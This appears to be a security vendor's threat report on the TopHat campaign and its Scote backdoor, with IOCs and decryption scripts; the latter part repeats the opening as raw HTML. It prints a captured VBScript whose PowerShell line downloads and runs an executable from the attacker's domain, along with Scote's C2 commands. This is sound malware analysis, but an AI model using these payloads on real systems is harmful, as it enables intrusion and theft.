Attackers used Arabic language decoy documents related to current events within the Palestine Territories as lures to entice victims to open and subsequently be infected by the malware. There is data indicating that these attacks are targeting individuals or organizations within the Palestinian Territories, which is detailed later.\nThe attacks themselves are deployed via four different means, two involving malicious RTF files, one involving self-extracting Windows executables, and the final using RAR archives.\nThe ultimate payload is a new malware family that we have dubbed \u201cScote\u201d based on strings we found within the malware samples. Scote provides backdoor access for an attacker and we have observed it collecting command and control (C2) information from Pastebin links as well as Google+ profiles. The bit.ly links obscured the C2 URLs so victims could not evaluate the legitimacy of the final site prior to clicking it. We are calling their recent activity the \u201cTopHat\u201d campaign.\nAdditionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of this testing enabled us to both note changes made over time as well as to observe other malware being submitted by the author. This other malware submitted provided overlaps with the previously reported DustySky campaign. In addition to testing malicious RTFs that deploy the Scote malware family, the same attacker was witnessed submitting files that appear to be new variants of the DustySky Core malware discussed in their report.\n\nMalware Delivery Techniques\nThe attacks we found within the TopHat campaign began in early September 2017. In a few instances, original filenames of the identified samples were written in Arabic. Specifically, we found the following names during this investigation:\n&nbsp;\n\n\n\nOriginal Filename\nTranslation\n\n\n\u0627\u0644\u0631\u0626\u064a\u0633 \u064a\u0628\u062f\u0627 \u0628\u062d\u0644 \u0627\u0644\u0633\u0644\u0637\u0629.rar\nThe president begins dissolving power.rar\n\n\n\u0627\u0644\u0631\u0626\u064a\u0633 \u064a\u0628\u062f\u0627 \u0628\u062d\u0644 \u0627\u0644\u0633\u0644\u0637\u0629.scr\nThe president begins dissolving power.scr\n\n\n\u0645\u062d\u0636\u0631 \u0627\u062c\u062a\u0645\u0627\u0639 \u0627\u0644\u064a\u0648\u0645.doc\nMinutes of today's meeting.doc\n\n\n\n&nbsp;\nWe observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the following four techniques, each of which we delve into in this blog:\n\nFigure 1 Malware delivery techniques\n\nTechnique #1 \u2013 RTFs Leveraging Bit.ly\nThe first technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then redirected to the below malicious site (note the intentional typo of \u201cstorage\u201d):\n&nbsp;\n\n\n\nURL\nRedirect\n\n\nhttp:\/\/bit[.]ly\/2y3XL3P\nhttp:\/\/storgemydata[.]website\/v.dat\n\n\n\n&nbsp;\nThis \u2018v.dat\u2019 file was in turn a PE32 executable file that has the following SHA256 hash:\n\n\n\nSHA256\n862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n\n\n\n&nbsp;\nLooking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late October of this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This provides clues as to who the victims are or where attackers may originate from.\n&nbsp;\n\nFigure 2 Statistics surrounding malicious redirect\n&nbsp;\nTechnique #2 \u2013 Don\u2019t Kill My Cat Attacks\nThe second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack discussed in July of this year called Don\u2019t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) file that contains shellcode within it. The DKMC tool and more information about this tactic may be found here.\nThis specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following:\n\nFigure 3 Malicious BMP image retrieved by downloader\nIt should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program.\nThis BMP file is loaded as shellcode. The first six bytes are read as the following instructions:\nseg000:00000000                 inc     edx\nseg000:00000001                 dec     ebp\nseg000:00000002                 jmp     loc_34D8B\n\nCode execution is then redirected to embedded shellcode.\nThe underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this file. This file is an instance of the Scote malware family. The size of the payload and the fact that it is embedded within the BMP file explains the large amount of distortion witnessed in the image above. In other words, the distortion witnessed is actually the shellcode and the embedded Scote malware. As this data is converted within a BMP image, we\u2019re left with what essentially looks like random pixels.\n\nTechnique #3 \u2013 RTFs Exploiting CVE-2017-0199.\nThis technique begins with malicious RTF files that make use of CVE-2017-0199 a Microsoft Office\/WordPad remote code execution (RCE) vulnerability patched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right provided by Google Translate):\n\nFigure 4 Lure used by malicious RTFs\nThis lure is related to an event reported in late August where President Mahmoud Abbas announced plans to convert a planned presidential palace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took place roughly a week before we observed these malware samples.\nThese RTFs will also download a file from the following location:\n\n \tstorgemydata[.]website\/update-online\/office-update.rtf\n\nNote that this is the same domain witnessed in the redirect used in technique #1. While the downloaded file has an RTF extension, it is in fact a VBScript with the following contents:\n&lt;script language=\"VBScript\"&gt;\nwindow.moveTo -4000, -4000\n  Set vFwhEtGt = CreateObject(\"Wscript.Shell\")\n  Set lfTi = CreateObject(\"Scripting.FileSystemObject\")\n  If 1=1 Then\n    vFwhEtGt.Run (\"PowerShell.exe -WindowStyle Hidden $d=$env:userprofile+'\\\\start Menu\\\\Programs\\\\Startup\\\\\\12330718701ac441736a55e3ee3cx996.exe';(New-Object System.Net.WebClient).DownloadFile('http:\/\/storgemydata[.]website\/x.exe',$d);Start-Process $d;\"),0\n\t\t End If\n  window.close()\n&lt;\/script&gt;\n\nThis VBScript script executes a PowerShell command that will download and execute a file from the following location:\n\n \thttp:\/\/storgemydata[.]website\/x.exe\n\nThis final \u2018x.exe\u2019 executable file is an instance of the Scote malware family.\n\nTechnique #4 \u2013 Self-extracting Executables\nThe last technique makes use of self-extracting executable files to both load a decoy document and spawn an instance of Scote. When the malware is run it will drop a file with an original filename of \u2018abbas.rtf\u2019, which contains the following contents:\n\nFigure 5 TopHat decoy document with rough translation\nAdditionally, an instance of Scote is loaded on the victim machine.\nThe decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President Mahmoud Abbas. This particular event was reported on August 23, 2017, just before Trump administration officials were set to visit Ramallah.\nLater in this blog, we will see the attackers leveraging this Donald Trump connection even more.\nWe originally witnessed these specific RTFs on September 6th, 2017, just two weeks after this event.\nBased on the observed statistics from the malicious redirect found in technique #1, as well as the content of this decoy document, we can infer that at least some of the targeted victims may very well be located in the Palestinian Territories.\n\nAnalysis of the Scote Malware\nThe Scote malware family employs a series of techniques and tricks when it is originally loaded onto a victim machine. However, underneath the various layers of obfuscation lies a fairly straightforward malware family that abuses legitimate third-party online services to host its C2 information.\nWhen Scote originally is run, it will decode embedded configuration information. This embedded configuration information contains URLs to third party online services, such as Pastebin postings or Google+ accounts. Scote will use this information to attempt to retrieve data from these URLS and parse it, such as in the following example:\n\nFigure 6 Google+ profile used by Scote malware\nIt should be noted that a total of three Google+ profiles have been observed and all of these profiles contained the name \u2018Donald Trump\u2019. This is interesting given the topics we saw being used to deliver the Scote malware family within the TopHat campaign, many of which also referred to the President of the Palestinian Territories.\nAfter C2 information is retrieved by Scote, it will communicate with these servers and can accept commands that perform the following actions:\n\n \tKill the Scote malware\n \tRun \u2018ipconfig\u2019 on the victim and return results\n \tRun \u2018cmd.exe \/C systeminfo\u2019 and return results\n \tLoad a DLL that is downloaded from a C2\n\nFor more information about the Scote malware family, please refer to the Appendix.\n\nIdentified Malware Testing Against Security Solutions\nWhen looking at the malicious RTF documents in technique #4 that exploit CVE-2017-0199 we found that all of the files we encountered were submitted within close succession of each other to an online service that tests them against multiple security products. Additionally, the original filenames of these files implied that an attacker may have been testing their malware against one or more security products.\n\n\n\nSHA256\nFilename\nDate\n\n\ncb6cf34853351ba62d4dd2c609d6a41c618881670d5652ffa7ddf5496e4693f0\ntest1.rtf\n2017-09-06 15:00:08 UTC\n\n\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64\nxx.rtf\n2017-09-06 15:00:53 UTC\n\n\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5\nxx2.rtf\n2017-09-06 15:01:49 UTC\n\n\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1\nxx2.rtf\n2017-09-06 15:05:30 UTC\n\n\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9\nxx2.rtf\n2017-09-06 15:08:32 UTC\n\n\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c\nxx2.rtf\n2017-09-06 15:18:14 UTC\n\n\n\n&nbsp;\nAs we can see by the timestamps shown above, the files were submitted anywhere from one to ten minutes apart from each other. Looking closer at these files we can see what changed between iterations.\n\nFigure 7 Modifications made to RTFs by attacker\nAs it so happens, the first RTF file this attacker attempted to test had very few detections. However, this was due to the fact that the attempts at commenting out the backslashes caused this file to not open at all within Microsoft Word. When you attempt to open this file, Word will simply render the content as it would a normal text file.\nIt appeared that the attacker realized this, as he or she quickly corrected this, and proceeded to make very minor modifications to try and evade security products. However, none of the modifications were terribly effective: all of these samples were found to have a high rate of detection.\nAs we can see in Figure 7, the attacker made multiple very small modifications between each iteration, specifically around the \u2018\\object\\objlink\\objupdate\u2019 string. This particular control allows the malicious content to be loaded by the RTF, as outlined in an analysis by MDSec. As such, the attacker likely felt this was what resulted in the RTF being detected as malicious, and attempted to obfuscated it.\n\nOverlap with the DustySky Campaign\nBesides being able to witness the attacker testing his or her malware, we noticed something interesting when we were looking at the individual who submitted these files. About a month and a half after these files were submitted, the same individual submitted the following three samples that we attribute to the DustySky campaign:\n\n \t202d1d51254eb13c64d143c387a87c5e7ce97ba3dcfd12dd202a640439a9ea3b\n \td18e09debde4748163efa25817b197f3ff0414d2255f401b625067669e8e571e\n \t3e4d0ffdde0b5db2a0a526730ff63908cefc9634f07ec027c478c123912554bb\n\nDustySky is a campaign published by ClearSky in January 2016 that discusses a politically motivated group that primarily targets organizations within the Middle East. The group has remained active since they were originally reported on, including a campaign identified by Unit 42 earlier this year. These files appear to be new variants of the DustySky Core malware discussed in the report and they communicate with the following domains over HTTPS:\n\n \tfulltext.yourtrap[.]com\n \tchecktest.www1[.]biz\n\nThe malware is dropped via a self-extracting executable, which contains an empty decoy document with the following name:\n\n \t\u0627\u0646\u0628\u0627\u0621 \u0639\u0646 \u0627\u062d\u062a\u062c\u0627\u0632 \u0627\u0644\u0631\u064a\u0654\u064a\u0633 \u0639\u0628\u0627\u0633 \u0641\u064a \u0627\u0644\u0633\u0639\u0648\u062f\u064a\u0629 \u0648\u0627\u0639\u0644\u0627\u0646 \u062f\u062d\u0644\u0627\u0646 \u0631\u064a\u0654\u064a\u0633\u0627 \u0644\u0641\u0644\u0633\u0637\u064a\u0646.docx\n\nThis can roughly be translated to the following:\n\n \tNews of the detention of President Abbas in Saudi Arabia and Dahlan's declaration as President of Palestine.docx\n\nAs we can see, the name of this decoy document is consistent with the lures witnessed in the TopHat campaign.\n\nConclusion\n\nAttackers often are found to leverage current events to accomplish their goal. In the TopHat campaign, we have observed yet another instance where a threat actor looks to be using political events to target individuals or organizations within the Palestine region. This campaign leveraged multiple methods to deploy a previously unseen malware family, including some relatively new tactics in the case of using a legitimate BMP file to load malicious shellcode.\nThe new malware family, which we have dubbed Scote, employs various tricks and tactics to evade detection, but provides relatively little functionality to the attackers once deployed. This may well be due to the fact it is still under active development. Scote uses some interesting methods when retrieving C2 information, including the use of Pastebin and Google+ accounts, as well as using bit.ly links to obscure the C2 URLs so victims could not evaluate the legitimacy of the final site prior to clicking it.\nThe TopHat campaign was found to have some overlaps discovered with the previously reported DustySky campaign when the attacker was identified to be submitting their files for testing purposes. Unit 42 will continue to track and monitor this threat and will report on any developments that occur.\nPalo Alto Networks customers are protected by this threat in the following ways:\n\n \tThe Scote malware family and the TopHat campaign have been tagged within AutoFocus for continued tracking\n \tDustySky is tagged within AutoFocus for ongoing tracking\n \tAll malicious domains discovered within this campaign have been appropriately flagged as malware\n \tAll samples are marked malicious within WildFire\n \tTraps identifies and blocks the exploits used by the RTF files\n\nAdditionally, Google, Pastebin, and bit.ly have been notified of the malicious content being hosted on their services.\n\nAppendix\nIndicators of Compromise\n\nSHA256 Hashes\nd3ead67228b3d7968ac767648b46a8e906affa0ebb5cc69f7acbed475a97204c\n03e2b932c013252fa2eb5e35390f9e21d0ff87e5b1c01683ebce0e8ce9b8d6df\n4df9488fbdfaf5d05fda65175a6b6e5331c58c967adbe972aa46c64b4fd0b1bb\n0dde9940f7896c2e4fb881dd185c3c3db280a9fd2ac2cb81988f43f5b0f6fcf7\n613da5f745c281acbffa4375e96394f8c912f58f92afe347e8a1f10fad3489bb\nd0f2d2d7d82c91fe64a64552e0e6200a096230fb6a64a1307928ae33ab2a5bf8\n7b6347093b27174e27228c2fde7d39e02d57315b354461aaf1dee3f0800fdfc3\nbdc633fe3145d87036ad759be855771d5bb3ca592cecca9ef7f41454d7cf9f05\ned9c62f77055a2498aec681b5653240be534595b97a9d11e92371639b0ca9a48\n7a1fa34ca804492415579c3ed4f505a7f09fcd7bc834590cff86e2ce77c4fc73\n862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5\n3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\nddc13c8d3d55562df873d4cf17181164922cb71d0c94edeb8fa143033c1214e0\nd4cb6b76dd352c928ca7184f583d14d800c090ba650dd26d8fa4febe901d1205\n5c0b253966befd57f4d22548f01116ffa367d027f162514c1b043a747bead596\n1f9bca1d5ce5d14d478d32f105b3ab5d15e1c520bde5dfca22324262e84d4eaf\nc9ba9e11a19120b58af1f6ccf3beb25744580592c680718a6fc205d662f2a20e\naa18b8175f68e8eefa12cd2033368bc1b73ff7caf05b405f6ff1e09ef812803c\nd409d26cffe6ce5298956bd65fd604edf9cfa14bc3373a7bdeb47091729f09e9\nd302f794d45c2a6eaaf58ade70a9044e28bc9ec43c9f7a1088a606684b1364b5\n1cd49a82243eacdd08eee6727375c1ab83e8ecca0e5ab7954c681038e8dd65a1\n8a158271521861e6362ee39710ac833c937ecf2d5cbf4065cb44f3232224cf64\n3627ed71588c7b55b35592c3b277910041f3d5ff917de721c53684ee18fcda40\n109996d28700fa0e8594d6ecca422418fa43e1b7cf5f9f4442a69264bf5fcea4\nc2815c72c9ea70db073775269ef04b1d061e93580f0f5fd3f3de25601641576a\n\nDomains\n\nstorgemydata[.]website\n&nbsp;\nScote Technical Analysis\nFor the technical analysis, we used the following sample:\n\n\n\nSHA256\n3540c2f0765773fa0a822fcf5fed5ed2a363ad11291a66ab1b488c9a4aa857f9\n\n\n\n&nbsp;\nThis particular sample begins as a self-extracting executable. When run, it will drop a \u2018e.exe\u2019 sample and execute the following SFX script commands:\nPath=%userprofile%\\start menu\\programs\\startup\\\nSetup=e.exe\nSilent=1\nOverwrite=1\nUpdate=U\n\n&nbsp;\nFor those unfamiliar with SFX commands, the series of commands above is silently deploying e.exe to the startup path. It will overwrite any instances where e.exe already exists in this path.\nThe \u2018e.exe\u2019 file is compiled in Delphi and has the following SHA256 hash:\n\n\n\nSHA256\n9580d15a06cd59c01c59bca81fa0ca8229f410b264a38538453f7d97bfb315e7\n\n\n\n&nbsp;\nWhen run, \u2018e.exe\u2019 will periodically decrypt strings at runtime using a simple single-byte XOR routine. While the routine allows for different bytes to be used, the author chose to use a key of 0xFF in every observed instance.\nThe malware proceeds to get the address of the NtDelayExecution function from ntdll.dll. This function is used by Sleep to cause a delay in program execution. After this function address has been resolved, it will overwrite the first five bytes to jmp to a malicious function, as seen below:\n\nFigure 8 Modifications to NtDelayExeuction\n&nbsp;\nThe malware proceeds to make a call to Sleep with an argument of 1, thus redirecting execution to this malicious function. This is likely an attempt at thwarting anti-virus and security solutions, however, has the adverse effect of preventing the malware from making subsequent calls to Sleep.\nThis malicious function continues to decode more strings using the single-byte XOR technique. Additionally, it will copy the following functions out of ntdll.dll for later use:\n\n \tZwCreateUserProcess\n \tZwAllocateVirtualMemory\n \tZwWriteVirtualMemory\n \tZwGetContextThread\n \tZwSetContextThread\n \tZwResumeThread\n\nA large blob of encrypted data is decrypted using a modified version of RC4. The following Python code may be used to decrypt this data. The key has consistently been observed to be \u201cqlNwuFVA9K8HpGNY6x0I\u201d.\nimport base64\nimport binascii\nimport hexdump\nimport sys\ndef rc4_crypt(data, key):\n  S = range(256)\n  j = 0\n  out = []\n  for i in range(256):\n    j = (j + S[i] + ord( key[i % len(key)] )) % 256\n    S[i] , S[j] = S[j] , S[i]\n  i = 0\n  for char in data:\n    j = (S[i % 256] + j) % 256\n    t = S[i%256]\n    S[i%256] = S[j]\n    S[j] = t\n    out.append(chr(ord(char) ^ S[(S[i%256] + S[j]) % 256]))\n    i += 1\n  return ''.join(out)\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\noutput = rc4_crypt(fd, \"qlNwuFVA9K8HpGNY6x0I\")\nf = open(\"decrypted_data.bin\",'wb')\nf.write(output)\nf.close()\n\n&nbsp;\nThis decrypted code is then copied to a newly allocated block of memory before execution flow is redirected to it. When this newly decrypted code is called, it is provided with a string argument containing the path to svchost.exe.\nThis new code is shellcode that will eventually decrypt an executable file and inject it into a newly spawned svchost.exe process.\nThe shellcode in question makes certain decisions by the author that demonstrates a lack of sophistication. For example, it will load a series of libraries and functions using a common ROR13 technique. This technique begins with the attacker taking a string of a library or function, such as \u2018CreateProcessA\u2019, and performing a binary ROR13 against it. In this example, the attacker has a result of a DWORD of 0x16B3FE72. This DWORD is then typically hardcoded within the shellcode. The malicious code then iterates through the functions of the necessary library and applies the same ROR13 technique against each function until it finds a match.\nThis shellcode uses the same approach, however, instead of providing the hardcoded DWORDs, it instead provides the clear-text library and function names, which then have the ROR13 applied. The resulting DWORD is then used. Unfortunately, this completely cancels out any obfuscation that might have originally been present.\nAfter the various libraries and functions are loaded, the shellcode decodes an embedded blob of data using a multi-byte XOR operation. The original key for this operation appears to have been \u2018Houdini\u2019, however, due to a likely mistake by the author, after the first iteration, a key of \u2018oudini\\x00\u2019 is used instead.\nThe following example Python code decodes this data found within the shellcode:\nimport sys\nfrom itertools import cycle, izip\ndef xor(message, key):\n  return ''.join(chr(ord(c)^ord(k)) for c,k in izip(message, cycle(key)))\ndef decode(data, size):\n  out = \"\"\n  key = \"oudini\\x00\"\n  b1 = xor(data[0], \"H\")\n  b2 = xor(data[1:size], key)\n  b = b1 + b2\n  for bite in b:\n    out += chr((ord(bite) + 128) &amp; 0xff)\n  return out\nfile = sys.argv[1]\nf = open(file, 'rb')\nfd = f.read()\nf.close()\nsize = 54272\noutput = decode(fd, size)\nf1 = \"embeddedShellcode.bin\"\nfh = open(f1, 'wb')\nfh.write(output)\nfh.close()\n\n&nbsp;\nThis decoded blob is a Microsoft Windows executable that contains the Scote payload. After this blob is decoded, a new instance of svchost.exe is spawned in a suspended state. The Scote payload is injected into this process prior to resuming it.\nScote begins by loading and decoding an embedded resource string. It is decoded first using base64 with a customized alphabet. The result is then base64-decoded using the traditional alphabet. The following alphabet is used for the first phase of decoding:\n\n \t0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+\/\n\nOnce decoded, we\u2019re provided with the following configuration (newlines and spacing added for presentation):\n[config]\n  [connection]\n    [param]http:\/\/pastebin[.]com\/raw\/2cLsuXj6[\/param]\n    [param]http:\/\/pastebin[.]com\/raw\/trZZJTGA[\/param]\n  [\/connection]\n  [install_name]e3HGAiPJ[\/install_name]\n  [nick_name]4c1h7vLX[\/nick_name]\n  [install_folder]noinstall[\/install_folder]\n  [reg_startup]false[\/reg_startup]\n  [folder_startup]false[\/folder_startup]\n  [task_startup]false[\/task_startup]\n  [injection]true[\/injection]\n  [injection_process]svchost[\/injection_process]\n\n&nbsp;\nThe configuration is parsed to determine if there are any connection \u2018param\u2019 parameters provided. In the event that there are, Scote will attempt to download the contents of these URLs via a simple GET request.\nThese pastebin URLs contained the following information, IPs have been defanged:\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n5.175.214[.]9:25\n5.175.214[.]9:53\n5.175.214[.]9:6000\n5.175.214[.]9:80\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n5.175.214[.]9:1434\n5.175.214[.]9:110\n5.175.214[.]9:2716\n5.175.214[.]9:8080\n}\n{x=c2NvdXR7DQo1LjE3NS4yMTQuOToyMg0KNS4xNzUuMjE0Ljk6MjMNCn0NCmVsaXRlew0KNS4xNzUuMjE0Ljk6NTAwMA0KNS4xNzUuMjE0Ljk6NDQzDQp9}\n\n&nbsp;\nIn addition to Pastebin, some samples were found connecting to the following three Google+ profiles:\n\n \thttps:\/\/plus.google[.]com\/104518099222750189969\n \thttps:\/\/plus.google[.]com\/110228699051788231047\n \thttps:\/\/plus.google[.]com\/106456556287604120942\n\nScote takes the response from these requests and parses data within \u2018scout{}\u2019. Other Scote versions attempted to identify data contained within \u2018{x=\u2019 and \u2018}\u2019. This data is decoded using the traditional Base64 algorithm. The results are similar to the following (IPs have been defanged):\nscout{\n5.175.214[.]9:22\n5.175.214[.]9:23\n}\nelite{\n5.175.214[.]9:5000\n5.175.214[.]9:443\n}\n\n&nbsp;\nThis information is used for subsequent communication and these values represent the Scote malware\u2019s C2.\nWhile there are a number of other configuration parameters within Scote, the connection params and the nick_name appear to be the only ones used. It\u2019s possible that Scote is still actively being developed and the author has yet to make use of the additional parameters provided within the configuration. A full list of identified Scote configurations may be found within the \u2018Scote Configurations\u2019 appendix.\nScote checks the current running process against the following list to ensure it is running within one of them:\n\n \tsvchost.exe\n \texplorer.exe\n \tchrome.exe\n \tfirefox.exe\n \tiexplorer.exe\n \topera.exe\n\nScote makes an ASM call to CPUID with an argument of 1 to query the victim\u2019s processor information and features. This information is used to generate a unique 8-character hash for that victim.\nScote then connects to the previously retrieved C2 servers and sends the following information via TCP:\ncommand=scote_connection|hwid=[8 character hash]\nIn the example above, [8 character hash] is replaced with the victim\u2019s unique hash. Scote continues to submit the following command periodically and will parse the response:\ncommand=scote_ping\nScote accepts the following five responses:\n\n\n\nCommand\nDescription\n\n\nscote_pong\nNo action taken by Scote\n\n\nscote_drop\nKill the Scote malware\n\n\nscote_info_ipconfig\nReturn the results of running \u2018ipconfig\u2019\n\n\nscote_info_systeminfo\nReturn the results of running \u2018cmd.exe \/C systeminfo\u2019\n\n\nscote_upgrade\nAccept a DLL from the remote C2 and load it.\n\n\n\n&nbsp;\nWhen Scote returns information in the following format:\ncommand=[command]|buffer=[data]\nIn the example above, [command] is replaced with the command received by the remote C2 server, and [data] is replaced with data that has been encoded using both traditional base64 as well as base64 with the nonstandard alphabet.\nScote

                    <p><span style="font-size: 18pt;">Summary</span><br />
In recent months, Palo Alto Networks Unit 42 observed a wave of attacks leveraging popular third-party services Google+, Pastebin, and bit.ly. Attackers used Arabic language decoy documents related to current events within the Palestine Territories as lures to entice victims to open and subsequently be infected by the malware. There is data indicating that these attacks are targeting individuals or organizations within the Palestinian Territories, which is detailed later.<br />
The attacks themselves are deployed via four different means, two involving malicious RTF files, one involving self-extracting Windows executables, and the final using RAR archives.<br />
The ultimate payload is a new malware family that we have dubbed “Scote” based on strings we found within the malware samples. Scote provides backdoor access for an attacker and we have observed it collecting command and control (C2) information from Pastebin links as well as Google+ profiles. The bit.ly links obscured the C2 URLs so victims could not evaluate the legitimacy of the final site prior to clicking it. We are calling their recent activity the “TopHat” campaign.<br />
Additionally, we tracked the apparent author testing their malware against numerous security products. Our tracking of this testing enabled us to both note changes made over time as well as to observe other malware being submitted by the author. This other malware submitted provided overlaps with the previously reported <a href="http://www.clearskysec.com/dustysky/">DustySky campaign</a>. In addition to testing malicious RTFs that deploy the Scote malware family, the same attacker was witnessed submitting files that appear to be new variants of the DustySky Core malware discussed in their report.<br />
<span style="font-size: 18pt;"><br />
Malware Delivery Techniques</span><br />
The attacks we found within the TopHat campaign began in early September 2017. In a few instances, original filenames of the identified samples were written in Arabic. Specifically, we found the following names during this investigation:<br />
&nbsp;</p>
<table align="center">
<tbody>
<tr>
<td width="234"><strong>Original Filename</strong></td>
<td width="234"><strong>Translation</strong></td>

<td width="234">The president begins dissolving power.rar</td>

<td width="234">Minutes of today&#8217;s meeting.doc</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
We observed a series of techniques used to deploy the Scote malware family. To date, at a high level, we have observed the following four techniques, each of which we delve into in this blog:<br />

<p style="text-align: center;"><em>Figure 1 Malware delivery techniques</em></p>
<p><span style="font-size: 18pt; line-height: 107%;"><br />
Technique #1 – RTFs Leveraging Bit.ly</span><br />
The first technique encountered included the use of malicious RTFs that made a HTTP request to the below URL which then redirected to the below malicious site (note the intentional typo of “storage”):<br />
&nbsp;</p>
<table align="center">
<tbody>
<tr>
<td width="234"><strong>URL</strong></td>
<td width="234"><strong>Redirect</strong></td>
</tr>
<tr>
<td width="234">http://bit[.]ly/2y3XL3P</td>
<td width="234">http://storgemydata[.]website/v.dat</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
This ‘v.dat’ file was in turn a PE32 executable file that has the following SHA256 hash:</p>
<table align="center">
<tbody>
<tr>
<td width="49">SHA256</td>
<td width="418">862a9836450a0988bc0f5bd5042392d12d983197f40654c44617a03ff5f2e1d5</td>
</tr>
</tbody>
</table>
<p>&nbsp;<br />
Looking at the publicly available statistics for the bit[.]ly redirect, we see the majority of activity taking place in late October of this year. Additionally, we see the majority of the downloads originating from both the Palestinian Territories as well as the United Arab Emirates. This provides clues as to who the victims are or where attackers may originate from.<br />

<p>&nbsp;<br />
<span style="font-size: 18pt; line-height: 107%;">Technique #2 – Don’t Kill My Cat Attacks</span><br />
The second technique uses an interesting tactic that Unit 42 has not seen before. Specifically, it makes use of an attack discussed in July of this year called Don’t Kill My Cat or DKMC. DKMC can enable an attacker to load a legitimate bitmap (BMP) file that contains shellcode within it. The DKMC tool and more information about this tactic may be found <a href="https://github.com/Mr-Un1k0d3r/DKMC">here</a>.<br />
This specific attack begins with a malicious executable file that downloads a legitimate BMP file that looks like the following:<br />
<img class="aligncenter wp-image-59101" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_3.png" alt="tophat_3" width="400" height="359" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_3.png 515w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_3-300x269.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_3-370x332.png 370w" sizes="(max-width: 400px) 100vw, 400px" /></p>
<p style="text-align: center;"><em>Figure 3 Malicious BMP image retrieved by downloader</em></p>
<p>It should be noted that this is the same image used in the DKMC presentation. It would appear that the attackers simply used the default settings of this particular program.<br />
This BMP file is loaded as shellcode. The first six bytes are read as the following instructions:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

<p>Code execution is then redirected to embedded shellcode.<br />
The underlying shellcode is decrypted at runtime using a 4-byte XOR key of 0x3C0922F0. The shellcode eventually loads an embedded UPX-packed executable and redirects execution to this file. This file is an instance of the Scote malware family. The size of the payload and the fact that it is embedded within the BMP file explains the large amount of distortion witnessed in the image above. In other words, the distortion witnessed is actually the shellcode and the embedded Scote malware. As this data is converted within a BMP image, we’re left with what essentially looks like random pixels.<br />

Technique #3 – RTFs Exploiting </span><span style="line-height: 107%;">CVE-2017-0199.</span></span><br />
This technique begins with malicious RTF files that make use of <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-0199">CVE-2017-0199</a> a Microsoft Office/WordPad remote code execution (RCE) vulnerability patched by Microsoft in September 2017. When opened, the following lure is displayed to the victim (translation on the right provided by Google Translate):<br />

<p style="text-align: center;"><em>Figure 4 Lure used by malicious RTFs</em></p>
<p>This lure is related to an event <a href="http://indianexpress.com/article/world/palestinians-to-turn-presidential-palace-into-national-library-4816384/">reported </a>in late August where President Mahmoud Abbas announced plans to convert a planned presidential palace into a national library. This is consistent with the timeline of the attacks we witnessed, as the event took place roughly a week before we observed these malware samples.<br />
These RTFs will also download a file from the following location:</p>
<ul>
<li>storgemydata[.]website/update-online/office-update.rtf</li>
</ul>
<p>Note that this is the same domain witnessed in the redirect used in technique #1. While the downloaded file has an RTF extension, it is in fact a VBScript with the following contents:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

Technique #4 – Self-extracting Executables</span><br />
The last technique makes use of self-extracting executable files to both load a decoy document and spawn an instance of Scote. When the malware is run it will drop a file with an original filename of ‘abbas.rtf’, which contains the following contents:<br />
<a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5.png" rel="wpdevart_lightbox"><img class="aligncenter wp-image-59179" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5.png" alt="tophat_5" width="600" height="386" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5-900x579.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5-300x193.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5-768x494.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/01/tophat_5-370x238.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
<p style="text-align: center;"><em>Figure 5 TopHat decoy document with rough translation</em></p>
<p>Additionally, an instance of Scote is loaded on the victim machine.<br />
The decoy document used discusses the potential dissolving of the Palestinian Authority (PA) by the President Mahmoud Abbas. This particular event was <a href="https://www.middleeastmonitor.com/20170823-abbas-considers-option-of-dissolving-pa-and-switching-power-to-plo/">reported </a>on August 23, 2017, just before Trump administration officials were set to visit Ramallah.<br />
Later in this blog, we will see the attackers leveraging this Donald Trump connection even more.<br />
We originally witnessed these specific RTFs on September 6<sup>th</sup>, 2017, just two weeks after this event.<br />
